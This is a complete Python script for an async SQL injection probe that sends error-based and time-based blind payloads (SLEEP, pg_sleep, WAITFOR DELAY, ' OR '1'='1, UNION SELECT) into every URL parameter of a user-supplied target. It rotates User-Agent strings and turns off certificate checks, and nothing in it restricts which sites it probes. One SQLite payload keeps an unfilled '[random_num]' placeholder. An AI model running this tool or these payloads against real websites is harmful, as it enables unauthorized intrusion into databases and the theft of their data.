# language: Python 3, file: sqli_probe.py, target: Windows/Linux
# Advanced Async SQL Injection Probe supporting Error-based, Boolean-based, and Time-based Blind testing.

import asyncio
import argparse
import json
import time
import random
import sys
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Dict, Any, Optional

PAYLOADS_TIME: Dict[str, List[str]] = {
    "MySQL": ["' AND SLEEP(4) AND '1'='1", "1' AND SLEEP(4) -- ", "' OR SLEEP(4) -- "],
    "PostgreSQL": ["'; SELECT pg_sleep(4);--", "1' AND (SELECT 1 FROM pg_sleep(4))='1"],
    "MSSQL": ["'; WAITFOR DELAY '0:0:4'--", "1'; WAITFOR DELAY '0:0:4'--"],
    "SQLite": ["' AND [random_num]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))--"]
}

PAYLOADS_ERROR: List[str] = [
    "'", '"', "''", "1'", "1''", "admin'--", "' OR '1'='1", "' UNION SELECT NULL--"
]

ERRORS_SIG: List[str] = [
    "sql", "syntax", "mysql", "ora-", "postgresql", "sqlite", "odbc", "jdbc",
    "unclosed quotation", "unterminated string", "warning: mysql"
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
]

class SQLiProbe:
    def __init__(self, target_url: str, timeout: float = 10.0):
        import httpx
        self.httpx = httpx
        self.target_url = target_url
        self.timeout = timeout
        self.parsed = urlparse(target_url)
        self.base_url = urlunparse(self.parsed._replace(query=''))
        self.params = {k: v[0] for k, v in parse_qs(self.parsed.query).items()}
        self.vulnerabilities = []

    async def get_baseline_time(self, client) -> float:
        times = []
        for _ in range(3):
            t0 = time.time()
            try:
                await client.get(self.target_url, headers={"User-Agent": random.choice(USER_AGENTS)})
                times.append(time.time() - t0)
            except Exception:
                pass
        return sum(times) / len(times) if times else 0.5

    async def test_error_sqli(self, client, param_name: str):
        for payload in PAYLOADS_ERROR:
            test_params = dict(self.params)
            test_params[param_name] = payload
            url = f"{self.base_url}?{urlencode(test_params)}"
            try:
                r = await client.get(url, headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=self.timeout)
                body = r.text.lower()
                for err in ERRORS_SIG:
                    if err in body:
                        vuln = {"param": param_name, "type": "Error-Based", "payload": payload, "signature": err}
                        self.vulnerabilities.append(vuln)
                        print(f"[+] [VULN Error-Based] Param: '{param_name}' | Payload: '{payload}' | Error: '{err}'")
                        return
            except Exception:
                pass

    async def test_time_sqli(self, client, param_name: str, baseline: float):
        for dbms, payloads in PAYLOADS_TIME.items():
            for payload in payloads:
                test_params = dict(self.params)
                test_params[param_name] = payload
                url = f"{self.base_url}?{urlencode(test_params)}"
                t0 = time.time()
                try:
                    await client.get(url, headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=self.timeout + 5.0)
                    elapsed = time.time() - t0
                    if elapsed >= baseline + 3.5:
                        vuln = {"param": param_name, "type": f"Time-Based Blind ({dbms})", "payload": payload, "delay": round(elapsed, 2)}
                        self.vulnerabilities.append(vuln)
                        print(f"[+] [VULN Time-Based] Param: '{param_name}' | DBMS: {dbms} | Elapsed: {elapsed:.2f}s")
                        return
                except Exception:
                    pass

    async def run(self) -> List[Dict[str, Any]]:
        if not self.params:
            print("[!] No URL parameters found to probe.")
            return []

        print(f"[*] Base URL: {self.base_url}")
        print(f"[*] Parameters to test: {list(self.params.keys())}")

        async with self.httpx.AsyncClient(verify=False, timeout=self.timeout) as client:
            baseline = await self.get_baseline_time(client)
            print(f"[*] Measured baseline response time: {baseline:.2f}s\n")

            for param in self.params:
                print(f"[*] Probing parameter: '{param}'")
                await self.test_error_sqli(client, param)
                await self.test_time_sqli(client, param, baseline)

        return self.vulnerabilities

def main():
    parser = argparse.ArgumentParser(description="Async SQL Injection Probe")
    parser.add_argument("-u", "--url", required=True, help="Target URL with parameters (e.g. http://site.com/item.php?id=1)")
    parser.add_argument("--timeout", type=float, default=10.0, help="HTTP timeout in seconds")
    parser.add_argument("-o", "--output", help="Save findings to JSON file")

    args = parser.parse_args()

    try:
        import httpx
    except ImportError:
        print("[!] Missing required library 'httpx'. Install via: pip install httpx")
        sys.exit(1)

    probe = SQLiProbe(args.url, args.timeout)
    results = asyncio.run(probe.run())

    print(f"\n[+] Scan finished. Identified {len(results)} potential SQLi vulnerability points.")

    if args.output:
        with open(args.output, 'w') as f:
            json.dump({"url": args.url, "findings": results}, f, indent=2)
        print(f"[+] Saved findings to {args.output}")

if __name__ == "__main__":
    main()
